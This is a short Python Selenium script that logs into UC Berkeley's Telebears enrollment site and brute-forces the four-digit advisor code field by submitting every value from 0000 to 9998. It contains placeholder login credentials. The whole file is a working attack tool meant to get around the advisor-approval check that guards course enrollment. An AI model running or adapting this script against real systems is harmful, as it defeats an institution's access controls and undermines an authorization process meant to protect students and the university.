import time
from selenium import webdriver

calnet_u = "username"
calent_p = "mysecretpassword"

baseurl = "https://telebears.berkeley.edu/telebears/enrollment"

refresh_every = 3

def force_refresh(num, refresh_every):
	return True if num%refresh_every == 0 else False

def run_brute_force(driver, refresh_every=3):
	# Load the page, start the for loop
	driver.get(baseurl)
	for i in range(0, 9999):
		snum = str(i).zfill(4)
		print snum
		# Set error points to force refresh
		if force_refresh(i, refresh_every):
			try:
				driver.get(baseurl)
			except:
				raise Exception("LoadError")
		# Get inputs for trying advisor code
		advcode = driver.find_element_by_xpath("//input[@name='advisorCode']")
		submit = driver.find_element_by_xpath("//input[@value='Submit']")
		# Test if code works
		advcode.send_keys(snum)
		try:
			submit.click()
		except:
			print "submit failed at: " + str(snum) + ", check page"
			break

if __name__ == "__main__":
	# Find advisor code with selenium
	mydriver = webdriver.Firefox()
	time.sleep(3)
	mydriver.get(baseurl)
	time.sleep(3)

	# Set login credentials for telebears
	username = mydriver.find_element_by_name("username")
	password = mydriver.find_element_by_name("password")
	# Input text in username and password inputboxes
	username.send_keys(calnet_u)
	password.send_keys(calent_p)
	# Login to telebears
	signin = mydriver.find_element_by_xpath("//input[@value='Sign In']")
	signin.click()

	# Load page after login
	mydriver.get(baseurl)
	# Start the iteration
	run_brute_force(mydriver, refresh_every)
